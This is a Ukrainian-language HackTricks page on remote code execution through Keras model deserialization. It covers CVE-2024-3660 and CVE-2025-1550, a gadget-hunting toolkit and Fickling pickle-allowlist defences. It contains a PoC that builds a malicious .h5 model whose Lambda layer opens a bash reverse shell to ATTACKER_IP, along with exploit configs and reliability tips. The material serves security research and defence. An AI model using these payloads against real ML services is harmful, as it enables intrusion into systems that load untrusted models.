# RCE під час десеріалізації моделі Keras і пошук Gadget

{{#include ../../banners/hacktricks-training.md}}

На цій сторінці узагальнено практичні техніки експлуатації конвеєра десеріалізації моделей Keras, пояснено внутрішню структуру нативного формату .keras і поверхню атаки, а також наведено інструментарій дослідника для пошуку Model File Vulnerabilities (MFVs) і gadget після виправлення вразливостей.

## Внутрішня структура формату моделі .keras

Файл .keras є ZIP-архівом, що містить щонайменше:<sup>[[1]](#references)</sup>
- metadata.json – загальна інформація (наприклад, версія Keras)
- config.json – архітектура моделі (основна поверхня атаки)
- model.weights.h5 – ваги у форматі HDF5

config.json керує рекурсивною десеріалізацією: Keras імпортує модулі, знаходить класи/функції та відновлює шари/об’єкти зі словників, контрольованих атакувальником.<sup>[[1]](#references)</sup>

Приклад фрагмента об’єкта шару Dense:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Десеріалізація виконує:<sup>[[1]](#references)</sup>
- Імпорт модулів і визначення символів із ключів module/class_name
- Виклик from_config(...) або конструктора з kwargs, контрольованими attacker
- Рекурсію у вкладені об’єкти (activations, initializers, constraints тощо)

Історично це надавало attacker, який створює config.json, три примітиви:<sup>[[1]](#references)</sup>
- Контроль того, які модулі імпортуються
- Контроль того, які класи/функції визначаються
- Контроль kwargs, що передаються конструкторам/from_config

## CVE-2024-3660 – RCE через байткод Lambda-layer

Першопричина:
- Legacy Lambda deserialization відновлювала Python-функцію з marshaled-коду, контрольованого attacker: `func_load()` декодує payload із base64, викликає `marshal.loads()` і створює `FunctionType`. Байткод отриманої функції виконується під час виклику Lambda, а loaders, уражені до версії 2.13, не застосовували перевірки safe mode для legacy-форматів.<sup>[[3]](#references)[[16]](#references)[[17]](#references)[[18]](#references)</sup>

У native Keras v3 archive функція Lambda представлена як об’єкт `__lambda__`, поле `code` якого містить marshaled-код, закодований у base64:<sup>[[17]](#references)[[18]](#references)</sup>
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"class_name": "__lambda__",
"config": {
"code": "<base64(marshal.dumps(function.__code__))>",
"defaults": null,
"closure": null
}
}
}
}
```
Mitigation:
- Keras за замовчуванням застосовує `safe_mode=True` для native Keras v3 format. Серіалізовані Python lambdas у `Lambda` блокуються, якщо користувач явно не вимкне цей захист за допомогою `safe_mode=False`; цей захист не поширюється на legacy formats у такий самий спосіб.<sup>[[1]](#references)[[16]](#references)[[17]](#references)</sup>

Notes:
- Legacy formats (старіші збереження HDF5) або старіші codebases можуть не застосовувати сучасні перевірки, тому атаки типу “downgrade” усе ще можливі, якщо жертви використовують старі loaders.

## CVE-2025-1550 – Arbitrary module import in Keras 3.0.0–3.8.x

Root cause:
- `_retrieve_class_or_fn` використовував `importlib.import_module(module)` із контрольованими атакувальником рядками module з `config.json`.
- Impact: спеціально створений `.keras` archive міг змусити `Model.load_model()` імпортувати вибрані атакувальником Python modules і functions із побічними ефектами під час імпорту та аргументами, контрольованими атакувальником, навіть за `safe_mode=True`.<sup>[[1]](#references)[[4]](#references)</sup>

Exploit idea:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Покращення безпеки (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
- Allowlist модулів: імпорти обмежені модулями офіційної екосистеми: keras, keras_hub, keras_cv, keras_nlp
- Безпечний режим за замовчуванням: safe_mode=True блокує небезпечне завантаження серіалізованих функцій Lambda
- Базова перевірка типів: десеріалізовані об'єкти мають відповідати очікуваним типам

## Практична експлуатація: TensorFlow-Keras HDF5 (.h5) Lambda RCE

Застарілі розгортання TensorFlow-Keras можуть і досі приймати файли моделей HDF5 (`.h5`). Якщо атакувальник може завантажити модель, яку сервер згодом завантажує або використовує для виконання inference, уразливий loader може десеріалізувати шар Lambda, що містить контрольований атакувальником Python-код, який потім може виконуватися в робочому процесі моделі застосунку.<sup>[[3]](#references)[[7]](#references)[[16]](#references)</sup>

Мінімальний PoC для створення шкідливого .h5, Lambda у якому виконує reverse shell, коли ціль викликає модель:
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
Нотатки та поради щодо надійності:
- Точки запуску відрізняються залежно від формату та workflow; у наведеному write-up payload виконався двічі під час prediction. Вважайте побічні ефекти повторюваними та робіть payload idempotent.<sup>[[7]](#references)</sup>
- Фіксація версій: узгодьте TF/Keras/Python із середовищем жертви, щоб уникнути невідповідностей серіалізації. Наприклад, створюйте артефакти в Python 3.8 із TensorFlow 2.13.1, якщо саме це використовує target.<sup>[[7]](#references)</sup>
- Швидке відтворення середовища:
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- Перевірка: безпечне навантаження на кшталт os.system("ping -c 1 YOUR_IP") допомагає підтвердити виконання (наприклад, спостерігаючи ICMP за допомогою tcpdump) перед переходом до reverse shell.<sup>[[7]](#references)</sup>

## Post-fix gadget surface inside allowlist

Навіть із allowlist модулів Keras і safe mode дозволені callables можуть створювати побічні ефекти. Наприклад, `keras.utils.get_file` завантажує URL і записує його до налаштованого розташування cache, що робить його кандидатом для gadget analysis.<sup>[[1]](#references)[[19]](#references)</sup>

Конфігурація Candidate Lambda (перевірте сигнатуру виклику в контрольованому тесті):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {
"module": "keras.utils",
"class_name": "get_file",
"config": null,
"registered_name": null
},
"arguments": {
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Важливе обмеження:
- `Lambda.call()` завжди передає вхідні дані моделі як перший позиційний аргумент, а налаштовані `arguments` — як іменовані аргументи. Для `get_file` це позиційне значення заповнює `fname`; невідповідність між tensor і path може спричинити збій цього кандидата ще до будь-якого завантаження, тому це не гарантовано робочий gadget.<sup>[[1]](#references)[[16]](#references)[[19]](#references)</sup>

## ML pickle import allowlisting for AI/ML models (Fickling)

Багато форматів AI/ML-моделей (PyTorch `.pt`/`.pth`/`.ckpt`, артефакти joblib/scikit-learn та інші Python-native формати) містять дані Python pickle. Застарілий шлях Keras Lambda, описаний вище, натомість використовує marshaled function bytecode, тому це окремий ризик десеріалізації. Під час десеріалізації pickle opcodes можуть викликати контрольовану зловмисником поведінку, зокрема tampering моделі або RCE, а прості сканери можуть пропускати нові чи не внесені до списку небезпечні імпорти.<sup>[[7]](#references)[[8]](#references)[[14]](#references)[[18]](#references)</sup>

Практичний fail-closed захист полягає в перехопленні pickle deserializer Python і дозволі лише перевіреного набору harmless ML-related imports під час unpickling. Fickling від Trail of Bits реалізує цю політику та постачається з curated ML import allowlist, сформованим на основі тисяч публічних pickle-файлів із Hugging Face.<sup>[[8]](#references)[[13]](#references)</sup>

Модель безпеки для “safe” imports (інтуїції, узагальнені з досліджень і практики): символи, імпортовані та використані pickle, повинні одночасно:<sup>[[8]](#references)</sup>
- Не виконувати код і не спричиняти його виконання (без compiled/source code objects, запуску shell-команд, hooks тощо)
- Не отримувати та не встановлювати довільні attributes або items
- Не імпортувати та не отримувати references на інші Python objects із pickle VM
- Не запускати жодні secondary deserializers (наприклад, marshal або вкладений pickle), навіть опосередковано

Увімкніть protections Fickling якомога раніше під час запуску процесу, щоб усі pickle loads, які виконуються frameworks (`torch.load`, `joblib.load` тощо), перевірялися:<sup>[[9]](#references)</sup>
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Практичні поради:
- За потреби ви можете тимчасово вимкнути або знову ввімкнути hooks:<sup>[[9]](#references)</sup>
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- Якщо перевірену модель заблоковано, розширте allowlist для вашого середовища після перевірки символів:<sup>[[9]](#references)</sup>
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling також надає generic runtime guards, якщо вам потрібен більш granular контроль:<sup>[[9]](#references)</sup>
- fickling.always_check_safety() для застосування перевірок до всіх pickle.load()
- with fickling.check_safety(): для застосування перевірок у визначеній області
- fickling.load(path) / fickling.is_likely_safe(path) для одноразових перевірок

- За можливості надавайте перевагу форматам моделей, відмінним від pickle (наприклад, SafeTensors).<sup>[[15]](#references)</sup> Якщо ви змушені приймати pickle, запускайте loaders із мінімальними привілеями, без network egress, і застосовуйте allowlist.

Ця стратегія allowlist-first демонстраційно блокує поширені шляхи експлуатації ML pickle, водночас зберігаючи високу сумісність. У benchmark ToB Fickling виявив 100% синтетичних шкідливих файлів і дозволив приблизно 99% чистих файлів із популярних репозиторіїв Hugging Face.<sup>[[8]](#references)[[10]](#references)</sup>


## Інструментарій дослідника

1) Систематичне виявлення gadget у дозволених модулях

Перелічіть потенційні callable у keras, keras_nlp, keras_cv, keras_hub і визначте пріоритет для тих, що мають побічні ефекти роботи з файлами, мережею, процесами або env.<sup>[[1]](#references)</sup>

<details>
<summary>Перелічити потенційно небезпечні callable у allowlisted модулях Keras</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) Пряме тестування десеріалізації (архів `.keras` не потрібен)

Передавайте спеціально створені dict безпосередньо до десеріалізаторів Keras, щоб визначити прийнятні параметри та спостерігати за побічними ефектами.<sup>[[1]](#references)</sup>
```python
import keras

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {
"module": "keras.utils",
"class_name": "get_file",
"config": null,
"registered_name": null
},
"arguments": {
"origin": "https://example.com/x",
"cache_dir": "/tmp/keras-cache"
}
}
}

layer = keras.saving.deserialize_keras_object(cfg, safe_mode=True)  # Observe behavior
```
3) Перевірка між версіями та форматами

Keras існує в кількох codebase/ератх із різними захисними механізмами та форматами:<sup>[[1]](#references)</sup>
- Вбудований у TensorFlow Keras: tensorflow/python/keras (legacy, заплановано видалення)
- tf-keras: підтримується окремо
- Multi-backend Keras 3 (official): представив native .keras

Повторюйте тести в різних codebase і форматах (.keras проти legacy HDF5), щоб виявити регресії або відсутні захисні механізми.

## References

- [1] [Пошук Vulnerabilities у Keras Model Deserialization (блог huntr)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – Додано перевірки до serialization](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – RCE через десеріалізацію Keras Lambda](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – arbitrary module import у Keras (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [звіт huntr – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [звіт huntr – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – TensorFlow .h5 Lambda RCE до root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [блог Trail of Bits – новий AI/ML pickle file scanner від Fickling](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – Захист AI/ML середовищ (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [корпус benchmark для pickle scanning у Fickling](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Передумови атак Sleepy Pickle](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [Проєкт SafeTensors](https://github.com/safetensors/safetensors)
- [16] [CERT/CC VU#253266 – Lambda Layers у Keras 2 дозволяють arbitrary code injection](https://kb.cert.org/vuls/id/253266)
- [17] [Вихідний код Keras Lambda layer (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/layers/core/lambda_layer.py)
- [18] [Вихідний код Keras Python utilities (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/utils/python_utils.py)
- [19] [API Keras `get_file`](https://keras.io/api/utils/python_utils/#get_file-function)
{{#include ../../banners/hacktricks-training.md}}
